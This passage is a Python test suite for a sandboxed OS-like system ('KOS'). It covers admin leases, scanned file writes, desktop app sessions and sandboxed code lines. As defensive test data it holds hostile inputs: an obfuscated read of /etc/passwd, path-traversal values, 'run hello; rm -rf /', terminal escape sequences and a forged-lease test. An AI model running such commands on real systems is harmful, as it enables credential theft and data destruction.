            with self.assertRaises(AdminError):
                self.kb().boot(g)
        self.assertFalse((self.paths.state / "admin-lease.json").exists())

    def test_requires_the_kernel_to_run(self):
        for report in ({"landlock_abi": 0, "user_namespaces": True},
                       {"landlock_abi": 3, "user_namespaces": False}):
            kb = self.kb(kernel_report=lambda r=report: r)
            with self.authority(PW).authorize("session.login") as g:
                with self.assertRaises(AdminError) as ctx:
                    kb.boot(g)
            self.assertIn("needs the KOS kernel", str(ctx.exception))
            self.assertFalse(kb.file.exists())
        self.assertEqual(kernel_gaps(GOOD_KERNEL), [])

    def test_kernel_is_rechecked_on_every_use(self):
        state = {"r": dict(GOOD_KERNEL)}
        kb = self.booted(kernel_report=lambda: state["r"])
        kb.require_booted()
        state["r"] = {"landlock_abi": 0, "user_namespaces": True}
        with self.assertRaises(AdminError):
            kb.require_booted()

    def test_no_keyboard_means_no_admin_keyboard(self):
        kb = self.kb(probe=lambda: [])
        with self.authority(PW).authorize("session.login") as g:
            with self.assertRaises(AdminError):
                kb.boot(g)

    def test_weak_dev_mode_is_explicit_and_marked(self):
        kb = self.kb(kernel_report=lambda: {"landlock_abi": 0}, probe=lambda: [])
        with mock.patch.dict(os.environ, {"KOS_DEV_ADMIN_WEAK": "1"}):
            with self.authority(PW).authorize("session.login") as g:
                lease = kb.boot(g)
            self.assertTrue(lease.weak and not lease.exclusive)
            self.assertIn("WEAK", kb.status())
            kb.require_booted()
        with self.assertRaises(AdminError):             # the env var is needed on every use
            kb.require_booted()

    def test_expiry_other_boot_and_lock(self):
        t = {"now": 1000.0}
        kb = self.booted(now=lambda: t["now"])
        kb.require_booted()
        t["now"] += 9 * 3600
        with self.assertRaises(AdminError):
            kb.require_booted()
        kb2 = self.kb(boot_id=lambda: "boot-2", now=lambda: 1000.0)
        with self.assertRaises(AdminError):
            kb2.require_booted()
        kb3 = self.kb(boot_id=lambda: "boot-1", now=lambda: 1000.0)
        kb3.require_booted()
        kb3.shutdown()
        with self.assertRaises(AdminError):
            kb3.require_booted()

    def test_forged_lease_fails_the_signature(self):
        kb = self.booted(now=lambda: 1000.0)
        doc = json.loads(kb.file.read_text())
        doc["expires"] += 10 ** 9                       # an attacker extends it
        kb.file.write_text(json.dumps(doc))
        with self.authority(PW).authorize("file.write", "x") as g:
            with self.assertRaises(AdminError) as ctx:
                kb.verify(g)
        self.assertIn("signature", str(ctx.exception))

    def test_admin_prompter_reads_the_password_from_devices(self):
        dev = ScriptedDevices()
        keys = lambda text: [{"type": "key", "key": c} for c in text]
        dev.push(*keys("abcX"), {"type": "key", "key": "backspace"}, *keys("d"),
                 {"type": "key", "key": "enter"})
        out = io.StringIO()
        self.assertEqual(AdminPrompter(dev, out).password("pw: "), b"abcd")
        dev.push({"type": "key", "key": "escape"})
        self.assertIsNone(AdminPrompter(dev, out).password("pw: "))
        dev.close()


class TestGuardedWrite(AdminEnv):
    def setUp(self):
        super().setUp()
        self.kb_ = self.booted()
        from kos.requires import Ledger
        self.ledger = Ledger(self.paths)
        self.out = Path(self.tmp.name) / "out"
        self.out.mkdir()

    def write(self, name, data, answers=(PW,), **kw):
        return write_file(self.paths, self.authority(*answers), self.kb_,
                          str(self.out / name), data, **kw)

    def test_write_then_scan_then_optimize_are_required_afterwards(self):
        order, target = [], self.out / "a.txt"

        def scanner(data, label):
            order.append(("scan", target.exists(), self.ledger.owed("file.write")[0]["pending"][:]))
            return scan_bytes(data, label)

        def optimizer(paths, authority, grant=None):
            order.append(("optimize", target.exists(), self.ledger.owed("file.write")[0]["pending"][:]))
            return optimize(paths, authority, grant=grant)

        r = self.write("a.txt", b"hello", scanner=scanner, optimizer=optimizer)
        # the file is already there when the scan runs; both are owed until each is done
        self.assertEqual(order, [("scan", True, ["scan", "optimize"]), ("optimize", True, ["optimize"])])
        self.assertEqual(self.ledger.owed(), [])               # nothing left owed
        self.assertEqual(target.read_bytes(), b"hello")
        self.assertEqual(oct(target.stat().st_mode & 0o777), "0o600")
        self.assertTrue(r.scan.clean)
        self.assertIn("reclaimed", r.optimize_summary)

    def test_flagged_content_is_quarantined_afterwards_and_the_optimize_still_runs(self):
        called = []
        with self.assertRaises(WriteBlocked):
            self.write("bad.txt", EICAR, optimizer=lambda *a, **k: called.append(1))
        self.assertFalse((self.out / "bad.txt").exists())          # taken out of place
        self.assertEqual(len(list((self.paths.state / "quarantine").glob("write-*bad.txt"))), 1)
        self.assertEqual(called, [1])                              # optimize was still owed
        self.assertEqual(self.ledger.owed(), [])
        outcomes = [e["outcome"] for e in AuditLogFor(self.paths) if e["action"] == "file.write"]
        self.assertIn("quarantined-by-scan", outcomes)

    def test_failed_optimize_stays_owed_and_blocks_the_next_write_until_settled(self):
        def boom(paths, authority, grant=None):
            raise OSError("disk exploded")
        with self.assertRaises(OSError):
            self.write("c.txt", b"data", optimizer=boom)
        self.assertEqual([e["pending"] for e in self.ledger.owed()], [["optimize"]])   # scan done, optimize owed
        with self.assertRaises(AdminError) as ctx:
            self.write("d2.txt", b"x", answers=())                 # refused before any password
        self.assertIn("still owes: optimize", str(ctx.exception))
        self.assertFalse((self.out / "d2.txt").exists())
        from kos.admin import settle
        lines = settle(self.paths, self.authority(PW))
        self.assertTrue(any("settled" in l for l in lines))
        self.assertEqual(self.ledger.owed(), [])
        self.write("d2.txt", b"x")                                 # unblocked
        self.assertTrue((self.out / "d2.txt").exists())

    def test_a_crash_between_write_and_scan_is_remembered_across_restarts(self):
        from kos.requires import Ledger
        self.ledger.owe("file.write", str(self.out / "e.txt"))      # as if we died right after writing
        self.assertEqual(Ledger(self.paths).owed()[0]["pending"], ["scan", "optimize"])
        with self.assertRaises(AdminError):
            self.write("f.txt", b"x", answers=())

    def test_one_password_covers_scan_optimize_and_write(self):
        """The write's password also pays for the optimize (it re-seals apps),
        so the whole pipeline asks exactly once."""
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        r = self.write("d.txt", b"hello")                # authority(PW) has a single answer
        self.assertEqual((self.out / "d.txt").read_bytes(), b"hello")
        self.assertTrue(r.scan.clean)

    def test_refused_without_a_booted_keyboard_before_any_password(self):
        self.kb_.shutdown()
        with self.assertRaises(AdminError):
            self.write("e.txt", b"x", answers=())        # a prompt here would AssertionError
        self.assertFalse((self.out / "e.txt").exists())

    def test_wrong_password_writes_nothing(self):
        with self.assertRaises(AuthorizationDenied):
            self.write("f.txt", b"x", answers=("no", "no", "no"))
        self.assertFalse((self.out / "f.txt").exists())

    def test_kos_system_state_symlinks_and_directories_are_refused(self):
        self.paths.ensure()
        for target in (self.paths.state / "evil", self.paths.etc / "auth.json"):
            with self.assertRaises(AdminError):
                write_file(self.paths, self.authority(PW), self.kb_, str(target), b"x")
        (self.out / "link").symlink_to(self.out / "real")
        with self.assertRaises(AdminError):
            self.write("link", b"x")
        with self.assertRaises(AdminError):
            write_file(self.paths, self.authority(PW), self.kb_,
                       str(self.out / "nodir" / "f"), b"x")

    def test_forged_lease_is_refused_even_with_the_right_password(self):
        doc = json.loads(self.kb_.file.read_text())
        doc["keyboards"] = ["/dev/input/event99"]
        self.kb_.file.write_text(json.dumps(doc))
        with self.assertRaises(AdminError):
            self.write("g.txt", b"x")
        self.assertFalse((self.out / "g.txt").exists())

    def test_cli_write_refuses_with_exit_2_when_keyboard_not_booted(self):
        with tempfile.TemporaryDirectory() as d, mock.patch.dict(os.environ, {"KOS_ROOT": d}):
            code = kcli.main(["write", os.path.join(d, "x.txt"), "--text", "hi"])
            self.assertEqual(code, 2)
            self.assertFalse(os.path.exists(os.path.join(d, "x.txt")))
            self.assertEqual(kcli.main(["admin"]), 0)


def AuditLogFor(paths):
    from kos.auth import AuditLog
    return AuditLog(paths).entries()


# ---------------------------------------------------------------------------
# The desktop: everything is an app
# ---------------------------------------------------------------------------
import signal as _signal  # noqa: E402
import time as _time  # noqa: E402
from kos.desktop import Desktop, DesktopError, SYSTEM_APPS  # noqa: E402
from kos.system import SystemBridge, close_instance, list_apps, open_background  # noqa: E402
from kos.tui import TUISurface  # noqa: E402

SYSTEM_DIR = Path(__file__).resolve().parent.parent / "examples" / "system"
SDK_JS = Path(__file__).resolve().parent.parent / "sdk" / "js"


def _keys(text):
    return [{"type": "key", "key": c} for c in text]


ENTER = {"type": "key", "key": "enter"}


class TestRequestProtocol(unittest.TestCase):
    def test_valid_requests_pass_in_every_mode(self):
        for mode in ("tui", "graphical", "cmd"):
            self.assertEqual(validate_app_message({"cmd": "request", "action": "apps"}, mode)["action"], "apps")
            self.assertEqual(validate_app_message(
                {"cmd": "request", "action": "open", "app": "hello", "mode": "graphical"}, mode)["mode"],
                "graphical")
            validate_app_message({"cmd": "request", "action": "focus", "id": "hello-3fa9c1"}, mode)

    def test_hostile_requests_are_rejected(self):
        for bad in ({"cmd": "request", "action": "open", "app": "../../etc/passwd"},
                    {"cmd": "request", "action": "open", "app": "hello", "mode": "root"},
                    {"cmd": "request", "action": "focus", "id": "a/b"},
                    {"cmd": "request", "action": "close", "id": "hello"},
                    {"cmd": "request", "action": "format-disk"},
                    {"cmd": "request"}):
            with self.assertRaises(ProtocolError, msg=bad):
                validate_app_message(bad, "tui")

    def test_old_instance_records_without_the_system_flag_still_load(self):
        with tempfile.TemporaryDirectory() as d:
            reg = Registry(Paths(Path(d)))
            reg.dir.mkdir(parents=True)
            (reg.dir / "old-aaaaaa.json").write_text(json.dumps(
                {"id": "old-aaaaaa", "name": "old", "mode": "tui", "broker_pid": os.getpid(),
                 "sock_path": "/x", "log_path": "/y", "started": 0, "app_pid": 1,
                 "status": "running"}))
            self.assertFalse(reg.get("old-aaaaaa").system)


class TestSystemApps(Env):
    def test_system_apps_pack_scan_clean_and_ask_for_the_system_permission(self):
        for name in SYSTEM_APPS:
            out = Path(self.tmp.name) / f"{name}.kapp"
            m = pack(SYSTEM_DIR / name, out)
            self.assertEqual(m.name, name)
            if name == "wallpaper":
                self.assertEqual(m.permissions, (), name)             # the background only draws: no permission at all
            else:
                self.assertTrue(set(m.permissions) & {"ticks", "shell", "pointer", "animate", "network", "compose"} or m.scopes, name)   # widgets: ticks; handler: shell; pointer, effects: pointer; browser: network; the rest: system scopes
            self.assertNotIn("*", m.scopes, f"{name} holds the bare 'system' permission")
            self.assertEqual(m.runtime, "npm" if name != "hello" and m.driver != "interface" else m.runtime)
            self.assertTrue(scan_bytes(out.read_bytes(), name).clean)

    def test_an_app_cannot_claim_a_permission_that_does_not_exist(self):
        with self.assertRaises(KAppError):
            from kos.kapp import Manifest
            Manifest.parse(json.dumps({"name": "x", "version": "1", "runtime": "python",
                                       "entry": "a", "permissions": ["root"]}).encode())


class TestSystemBridge(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        self.sent, self.spawned = [], []

    def spawner(self, inst, app, mode, policy, registry, log_path, cache_dir=None):
        self.spawned.append((inst.name, mode))
        inst.status, inst.broker_pid = "running", os.getpid()
        registry.write(inst)

    def ask(self, req, *answers):
        bridge = SystemBridge(self.paths, spawner=self.spawner)
        switch = bridge.handle(req, self.sent.append, self.authority(*answers))
        return switch, self.sent[-1]

    def test_apps_lists_installed_with_permit_state_and_needs_no_password(self):
        _, reply = self.ask({"cmd": "request", "action": "apps"})
        self.assertEqual(reply["cmd"], "apps")
        self.assertEqual([(a["name"], a["permitted"]) for a in reply["installed"]], [("hello", False)])
        PermitStore(self.paths).grant("hello")
        self.assertTrue(list_apps(self.paths)[0]["permitted"])

    def test_open_is_refused_without_permit_and_never_asks_for_a_password(self):
        _, reply = self.ask({"cmd": "request", "action": "open", "app": "hello", "mode": "tui"})
        self.assertFalse(reply["ok"])
        self.assertIn("permission to run", reply["detail"])
        self.assertEqual(self.spawned, [])

    def test_open_needs_the_password_and_wrong_password_opens_nothing(self):
        PermitStore(self.paths).grant("hello")
        req = {"cmd": "request", "action": "open", "app": "hello", "mode": "tui"}
        _, reply = self.ask(req, "no", "no", "no")
        self.assertFalse(reply["ok"])
        self.assertEqual(self.spawned, [])
        _, reply = self.ask(req, PW)
        self.assertTrue(reply["ok"])
        self.assertEqual(self.spawned, [("hello", "tui")])
        self.assertRegex(reply["id"], r"^hello-[0-9a-f]{6}$")
        self.assertEqual(Registry(self.paths).get(reply["id"]).status, "running")

    def test_open_cannot_start_a_mode_the_app_does_not_have(self):
        PermitStore(self.paths).grant("hello")
        _, reply = self.ask({"cmd": "request", "action": "open", "app": "web", "mode": "tui"}, PW)
        self.assertFalse(reply["ok"])                       # not installed
        self.assertEqual(self.spawned, [])

    def test_focus_switches_only_to_a_running_instance(self):
        Registry(self.paths).write(Instance(id="hello-aaaaaa", name="hello", mode="tui",
                                            broker_pid=os.getpid(), sock_path="/x", log_path="/y",
                                            started=0, status="running"))
        switch, reply = self.ask({"cmd": "request", "action": "focus", "id": "hello-aaaaaa"})
        self.assertEqual(switch, ("instance", "hello-aaaaaa"))
        self.assertTrue(reply["ok"])
        switch, reply = self.ask({"cmd": "request", "action": "focus", "id": "hello-bbbbbb"})
        self.assertIsNone(switch)
        self.assertFalse(reply["ok"])

    def test_close_needs_the_password(self):
        Registry(self.paths).write(Instance(id="hello-cccccc", name="hello", mode="tui",
                                            broker_pid=999999999, sock_path="/x", log_path="/y",
                                            started=0, status="exited"))
        req = {"cmd": "request", "action": "close", "id": "hello-cccccc"}
        _, reply = self.ask(req, "no", "no", "no")
        self.assertFalse(reply["ok"])
        self.assertEqual(len(Registry(self.paths).list()), 1)
        _, reply = self.ask(req, PW)
        self.assertTrue(reply["ok"])
        self.assertEqual(Registry(self.paths).list(), [])


class DesktopSessionEnv(Env):
    """Runs a real sandboxed app in a Session against scripted devices."""

    def start(self, kapp_dir, name, mode="tui", *, bridge=None, authority=None, **kw):
        kapp = Path(self.tmp.name) / f"{name}.kapp"
        pack(kapp_dir, kapp)
        store = AppStore(self.paths)
        store.install(kapp, self.authority(PW))
        PermitStore(self.paths).grant(name)
        with self.authority(PW).authorize("app.run", name) as g:
            app = store.load_verified(name, g)
        a, b = socket.socketpair()
        proc = loader.launch(loader.plan(app, b.fileno(), mode), SandboxPolicy(), None)
        b.close()
        self.devices = ScriptedDevices()
        self.outfile = tempfile.TemporaryFile()
        self.addCleanup(self.outfile.close)
        surface = (CmdSurface(self.outfile.fileno(), 100, 30, name) if mode == "cmd"
                   else TUISurface(self.outfile.fileno(), 100, 30, name))
        auth = authority or Authority(self.paths, None, Throttle(self.paths, base=0))
        self.outcome = {}
        self.session = Session(name=name, mode=mode, channel=Channel(a), proc=proc, surface=surface,
                               devices=self.devices, authority=auth, bridge=bridge,
                               outcome=self.outcome, **kw)
        return self.session

    def output(self):
        self.outfile.seek(0)
        return self.outfile.read().decode(errors="replace")

    def when_modal(self, needle, then, timeout=15):
        """Push `then` once the OS's trusted prompt mentioning `needle` is on screen."""
        def watch():
            end = _time.monotonic() + timeout
            while _time.monotonic() < end:
                m = self.session.surface.modal
                if m is not None and needle in m.title:
                    self.devices.push(*then)
                    return
                _time.sleep(0.02)
        t = threading.Thread(target=watch, daemon=True)
        t.start()
        return t

    def boot_both(self):
        self.devices.push(*_keys("y"), *_keys(PW), ENTER, *_keys("y"), *_keys(PW), ENTER)


class TestDesktopSessions(DesktopSessionEnv):
    def test_app_without_system_permission_is_told_no(self):
        # run the real taskbar but hand the session NO bridge
        s = self.start(SYSTEM_DIR / "taskbar", "taskbar")
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        self.assertIn("does not have the 'system' permission", self.output())

    def test_taskbar_lists_running_apps_and_asks_the_os_to_switch(self):
        Registry(self.paths).write(Instance(id="hello-aaaaaa", name="hello", mode="tui",
                                            broker_pid=os.getpid(), sock_path="/x", log_path="/y",
                                            started=0, status="running"))
        s = self.start(SYSTEM_DIR / "taskbar", "taskbar", bridge=SystemBridge(self.paths))
        self.boot_both()
        threading.Timer(2.5, lambda: self.devices.push(*_keys("1"))).start()
        s.run(first_frame_timeout=1.0)
        self.assertIn("hello-aaaaaa", self.output())             # the taskbar drew the open app
        self.assertEqual(self.outcome["switch"], ("instance", "hello-aaaaaa"))

    def test_right_mouse_opens_the_app_library_and_the_app_never_sees_it(self):
        s = self.start(EXAMPLE, "hello", "cmd", right_click_to="library-aaaaaa")
        self.boot_both()
        left = {"type": "button", "button": "left", "pressed": True, "x": 1, "y": 1}
        right = {"type": "button", "button": "right", "pressed": True, "x": 1, "y": 1}
        self.devices.push(left, right)
        s.run(first_frame_timeout=0.5)
        self.assertEqual(self.outcome["switch"], ("instance", "library-aaaaaa"))
        out = self.output()
        self.assertIn('"button":"left"', out)                    # ordinary clicks still reach the app
        self.assertNotIn('"button":"right"', out)                # the right button is the OS's

    def test_devices_booted_by_the_desktop_carry_over_with_no_new_prompt(self):
        s = self.start(EXAMPLE, "hello", "cmd", preboot=("mouse", "keyboard"))
        self.devices.push(*_keys("x"), {"type": "interrupt"})   # no y/password anywhere
        s.run(first_frame_timeout=0.5)
        self.assertEqual(self.devices.booted, ["mouse", "keyboard"])
        out = self.output()
        self.assertIn('"state":"attached"', out)
        self.assertIn('"cmd":"key","key":"x"', out)              # keys flow immediately
        self.assertEqual(sorted(self.outcome["booted"]), ["keyboard", "mouse"])

    def test_app_library_opens_an_app_with_a_password_typed_in_the_os_prompt(self):
        """The whole chain, with real processes: the App Library (sandboxed
        app) asks -> the OS prompts for the password in its own overlay ->
        the OS verifies the seal and starts hello under a real broker ->
        the library asks to switch -> the session ends pointing at it."""
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        PermitStore(self.paths).grant("hello")
        auth = Authority(self.paths, None, Throttle(self.paths, base=0))
        s = self.start(SYSTEM_DIR / "app-library", "app-library",
                       bridge=SystemBridge(self.paths), authority=auth)
        self.boot_both()
        # the library draws "hello" (the only non-system app); Enter asks to open it
        threading.Timer(3.0, lambda: self.devices.push(ENTER)).start()
        self.when_modal("Password to open app", [*_keys(PW), ENTER])
        threading.Timer(25.0, lambda: self.devices.push({"type": "interrupt"})).start()
        s.run(first_frame_timeout=1.0)
        self.assertIn("hello", self.output())
        switch = self.outcome["switch"]
        self.assertIsNotNone(switch, "library never asked to switch to the app it opened")
        self.assertRegex(switch[1], r"^hello-[0-9a-f]{6}$")
        self.assertEqual(Registry(self.paths).get(switch[1]).status, "running")
        granted = [(e["action"], e["target"]) for e in auth.audit.entries() if e["outcome"] == "granted"]
        self.assertIn(("app.open", "hello"), granted)

    def tearDown(self):
        # Must run BEFORE Env.tearDown deletes the registry (addCleanup runs
        # after tearDown, by which point there is nothing left to find).
        self._kill_brokers()
        super().tearDown()

    def _kill_brokers(self):
        for inst in Registry(self.paths).list():
            if inst.broker_pid == os.getpid():
                continue            # a fake record some test wrote pointing at itself
            try:
                os.kill(inst.broker_pid, _signal.SIGTERM)
            except (ProcessLookupError, PermissionError):
                pass
        for _ in range(50):
            if not [i for i in Registry(self.paths).list() if i.broker_pid != os.getpid()]:
                break
            _time.sleep(0.1)


class TestDesktopNavigation(unittest.TestCase):
    def run_desktop(self, script, home="taskbar-111111", library="library-222222"):
        calls = []

        def attach(target, ctx):
            calls.append((target, dict(ctx)))
            step = script.pop(0)
            if isinstance(step, Exception):
                raise step
            return step

        return Desktop(home, library, attach).run(), calls

    def test_starts_on_the_taskbar_and_ctrl_c_there_leaves(self):
        code, calls = self.run_desktop([{"exit_code": 0}])
        self.assertEqual(code, 0)
        self.assertEqual([c[0] for c in calls], ["taskbar-111111"])
        self.assertEqual(calls[0][1]["right_click_to"], "library-222222")

    def test_ctrl_c_in_an_app_returns_to_the_taskbar_not_out_of_the_desktop(self):
        code, calls = self.run_desktop([
            {"switch": ("instance", "hello-333333"), "booted": ["mouse", "keyboard"]},
            {"switch": None},            # Ctrl-C inside hello -> back home
            {"exit_code": 0}])           # Ctrl-C on the taskbar -> leave
        self.assertEqual([c[0] for c in calls], ["taskbar-111111", "hello-333333", "taskbar-111111"])
        self.assertEqual(calls[1][1]["preboot"], ("mouse", "keyboard"))   # devices carried over
        self.assertEqual(calls[2][1]["preboot"], ("mouse", "keyboard"))

    def test_right_mouse_target_is_the_library_but_not_while_in_the_library(self):
        _, calls = self.run_desktop([
            {"switch": ("instance", "library-222222")}, {"switch": None}, {"exit_code": 0}])
        self.assertEqual(calls[1][0], "library-222222")
        self.assertIsNone(calls[1][1]["right_click_to"])

    def test_vanished_app_falls_back_home_but_vanished_taskbar_is_an_error(self):
        _, calls = self.run_desktop([
            {"switch": ("instance", "hello-333333")}, KAppError("gone"), {"exit_code": 0}])
        self.assertEqual([c[0] for c in calls], ["taskbar-111111", "hello-333333", "taskbar-111111"])
        with self.assertRaises(DesktopError):
            self.run_desktop([KAppError("gone")])


class TestLoginBootsAdminKeyboard(AdminEnv):
    def test_one_password_unlocks_and_boots_it_and_locking_drops_it(self):
        import kos.init as kinit
        prompter = ScriptedPrompter([PW])               # exactly one password for the whole login
        lease = self.paths.state / "admin-lease.json"
        seen = {}

        def fake_shell(console):
            seen["lease_while_shell_runs"] = lease.exists()
            seen["shell"] = kinit.shell_argv()
            return 0

        with mock.patch.object(kinit, "TTYPrompter", lambda console: prompter), \
                mock.patch.object(kinit, "AdminKeyboard", lambda paths: self.kb()), \
                mock.patch.object(kinit, "start_shell", fake_shell), \
                mock.patch.object(kinit.time, "sleep", lambda s: None):
            with self.assertRaises(AssertionError):     # the 2nd login asks again: the script has no answer
                kinit.login_loop(self.paths, "/dev/null")
        self.assertTrue(seen["lease_while_shell_runs"])
        self.assertFalse(lease.exists())                # locked: nothing elevated survives
        self.assertTrue(any("Administrator keyboard booted" in m for m in prompter.messages))
        self.assertEqual(seen["shell"], ["/opt/kos/bin/kos", "line"])   # login starts the line shell

    def test_unlock_requires_the_keyboard_which_requires_the_kernel(self):
        import kos.init as kinit
        prompter = ScriptedPrompter([PW])
        shells = []
        no_kernel = lambda paths: self.kb(kernel_report=lambda: {"landlock_abi": 0})

        with mock.patch.object(kinit, "TTYPrompter", lambda console: prompter), \
                mock.patch.object(kinit, "AdminKeyboard", no_kernel), \
                mock.patch.object(kinit, "start_shell", lambda c: shells.append(1) or 0), \
                mock.patch.object(kinit.time, "sleep", lambda s: None):
            with self.assertRaises(AssertionError):            # it asks again: still locked
                kinit.login_loop(self.paths, "/dev/null")
        self.assertEqual(shells, [])                            # the shell NEVER started
        self.assertFalse((self.paths.state / "admin-lease.json").exists())
        self.assertTrue(any("session.unlock requires admin.keyboard requires kernel" in m
                            for m in prompter.messages), prompter.messages)


class TestRequires(Env):
    def test_chain_is_followed_deepest_first_and_named_when_it_fails(self):
        from kos.requires import Requirements, Unsatisfied
        log = []
        state = {"kernel": False, "kb": False}
        engine = Requirements(
            {"kernel": lambda: None if state["kernel"] else "no kernel",
             "admin.keyboard": lambda: None if state["kb"] else "keyboard off"},
            {"admin.keyboard": lambda: (log.append("boot kb"), state.update(kb=True))})
        with self.assertRaises(Unsatisfied) as ctx:
            engine.ensure("session.unlock")
        self.assertEqual(ctx.exception.chain, ["session.unlock", "admin.keyboard", "kernel"])
        self.assertEqual(str(ctx.exception), "session.unlock requires admin.keyboard requires kernel: no kernel")
        self.assertEqual(log, [])                    # the keyboard was never booted without the kernel
        state["kernel"] = True
        self.assertEqual(engine.ensure("session.unlock"), ["admin.keyboard"])
        self.assertEqual(log, ["boot kb"])
        self.assertEqual(engine.ensure("session.unlock"), [])      # already up: nothing to boot

    def test_circular_requirements_are_refused(self):
        from kos.requires import Requirements, Rule, Unsatisfied
        engine = Requirements({}, rules={"a": Rule(before=("b",)), "b": Rule(before=("a",))})
        with self.assertRaises(Unsatisfied):
            engine.ensure("a")

    def test_unreadable_ledger_blocks_instead_of_freeing(self):
        from kos.requires import Ledger
        led = Ledger(self.paths)
        self.paths.ensure()
        led.file.write_text("{not json")
        self.assertTrue(led.owed())


class TestCodeIsACommand(Env):
    """A line of code is a command - run as a sandboxed one-shot app."""

    def run_line(self, code, language="python", *answers, **kw):
        from kos.coderun import run_code
        out = []
        status = run_code(self.paths, lambda: self.authority(*answers), code, language,
                          out=out.append, **kw)
        return status, "\n".join(out)

    def test_python_line_runs_in_the_sandbox_after_the_password(self):
        status, out = self.run_line("print(6 * 7)", "code call", PW)
        self.assertEqual((status, out.strip()), (0, "42"))
        self.assertIn(("code.run", "granted"),
                      [(e["action"], e["outcome"]) for e in AuditLogFor(self.paths)])

    def test_wrong_password_runs_nothing(self):
        with self.assertRaises(AuthorizationDenied):
            self.run_line("print('x')", "code call", "no", "no", "no")

    def test_the_sandbox_holds_for_code_lines(self):
        _, out = self.run_line("p = '/etc/' + 'pass' + 'wd'; print(open(p).read())", "python", PW)
        self.assertIn("PermissionError", out)
        self.assertNotIn("root:", out)
        _, out = self.run_line("open('/tmp/kos-codeline-pwned', 'w').write('x')", "code call", PW)
        self.assertIn("PermissionError", out)
        self.assertFalse(os.path.exists("/tmp/kos-codeline-pwned"))
        _, out = self.run_line("import socket; socket.create_connection(('1.1.1.1', 80), 2)", "python", PW)
        self.assertIn("Error", out)

    def test_runaway_line_is_stopped(self):
        status, out = self.run_line("while True: pass", "python", PW, timeout=1.5)
        self.assertEqual(status, 124)
        self.assertIn("ran longer", out)

    def test_flagged_code_is_blocked_before_the_password(self):
        status, out = self.run_line("x = '" + EICAR.decode() + "'", "assignment")   # no answers: no prompt
        self.assertEqual(status, 3)
        self.assertIn("security scan", out)

    def test_language_without_a_runtime_is_a_command_that_runs_nothing(self):
        status, out = self.run_line("select * from users", "sql")                   # no password asked
        self.assertEqual(status, 66)
        self.assertIn("no sql compiler or interpreter wired in", out)
        status, out = self.run_line("run hello; rm -rf /", "shell")
        self.assertEqual(status, 66)

    def test_nothing_persists_between_lines(self):
        self.run_line("x = 5", "assignment", PW)
        _, out = self.run_line("print(x)", "code call", PW)
        self.assertIn("NameError", out)


class TestSystemRequestsProtocol(unittest.TestCase):
    def test_new_requests_validate(self):
        for ok in ({"action": "info"}, {"action": "optimize"}, {"action": "settle"},
                   {"action": "ls", "path": "/tmp"}, {"action": "view", "path": "/tmp/x"},
                   {"action": "scan", "path": "a.kapp"}, {"action": "permit", "app": "hello"},
                   {"action": "revoke", "app": "hello"}, {"action": "line", "text": "lista"}):
            self.assertEqual(validate_app_message({"cmd": "request", **ok}, "tui")["action"], ok["action"])

    def test_hostile_values_are_rejected_or_cleaned(self):
        for bad in ({"action": "ls", "path": ""}, {"action": "ls", "path": "a\x00b"},
                    {"action": "view", "path": "x" * 2000}, {"action": "ls", "path": 5},
                    {"action": "permit", "app": "../x"}):
            with self.assertRaises(ProtocolError, msg=bad):
                validate_app_message({"cmd": "request", **bad}, "tui")
        line = validate_app_message({"cmd": "request", "action": "line", "text": "ru\x1b[2Jn"}, "tui")
        self.assertNotIn("\x1b", line["text"])


class TestSystemBridgeActions(Env):
    def setUp(self):
        super().setUp()
        AppStore(self.paths).install(self.kapp, self.authority(PW))
        self.sent = []
        self.work = Path(self.tmp.name) / "work"
        self.work.mkdir()

    def ask(self, req, *answers):
        bridge = SystemBridge(self.paths)
        bridge.handle({"cmd": "request", **req}, self.sent.append, self.authority(*answers))
        return self.sent[-1]

    def test_info_reports_admin_kernel_owed_audit_and_permits(self):
        PermitStore(self.paths).grant("hello")
        r = self.ask({"action": "info"})
        self.assertEqual(r["cmd"], "info")
        self.assertIn("OFF", r["admin"])
        self.assertTrue(any("Landlock" in l for l in r["kernel"]))
        self.assertEqual(r["owed"], ["nothing is owed"])
        self.assertTrue(any("app.install" in l for l in r["audit"]))
        self.assertEqual(r["permits"], ["hello"])

    def test_ls_lists_folders_and_inside_zips_without_extracting(self):
        (self.work / "sub").mkdir()
        (self.work / "a.txt").write_text("hi")
        (self.work / "app.kapp").write_bytes(self.kapp.read_bytes())
        r = self.ask({"action": "ls", "path": str(self.work)})
        self.assertEqual([(e["name"], e["kind"]) for e in r["entries"]],
                         [("app.kapp", "zip"), ("sub", "dir"), ("a.txt", "file")])
        r = self.ask({"action": "ls", "path": str(self.work / "app.kapp")})
        self.assertIn("manifest.json", [e["name"] for e in r["entries"]])
        self.assertFalse((self.work / "manifest.json").exists())      # nothing was extracted

    def test_view_needs_the_password_and_strips_terminal_escapes(self):
        f = self.work / "n.txt"
        f.write_text("hello\n\x1b[2Jevil\n")
        r = self.ask({"action": "view", "path": str(f)}, "no", "no", "no")
        self.assertFalse(r["ok"])                                      # wrong password: no text at all
        r = self.ask({"action": "view", "path": str(f)}, PW)
        self.assertEqual(r["cmd"], "text")
        self.assertEqual(r["lines"][0], "hello")
        self.assertNotIn("\x1b", "".join(r["lines"]))

    def test_scan_flags_a_file_with_no_password(self):
        bad, ok = self.work / "bad.txt", self.work / "ok.txt"
        bad.write_bytes(EICAR)
        ok.write_text("fine")
        self.assertIn("FLAGGED", self.ask({"action": "scan", "path": str(bad)})["lines"][0])
        self.assertIn("clean", self.ask({"action": "scan", "path": str(ok)})["lines"][0])

    def test_optimize_and_settle_each_need_the_password(self):
        r = self.ask({"action": "optimize"}, "no", "no", "no")
        self.assertFalse(r["ok"])
        r = self.ask({"action": "optimize"}, PW)
        self.assertIn("reclaimed", r["lines"][0])
        from kos.requires import Ledger
        Ledger(self.paths).owe("file.write", str(self.work / "x"))
        r = self.ask({"action": "settle"}, PW)
        self.assertEqual(Ledger(self.paths).owed(), [])
        self.assertTrue(any("settled" in l for l in r["lines"]))

    def test_permit_and_revoke_need_the_password_and_an_installed_app(self):
        self.assertFalse(self.ask({"action": "permit", "app": "ghost"}, PW)["ok"])
        self.assertFalse(self.ask({"action": "permit", "app": "hello"}, "no", "no", "no")["ok"])
        self.assertFalse(PermitStore(self.paths).is_permitted("hello"))
        self.assertTrue(self.ask({"action": "permit", "app": "hello"}, PW)["ok"])
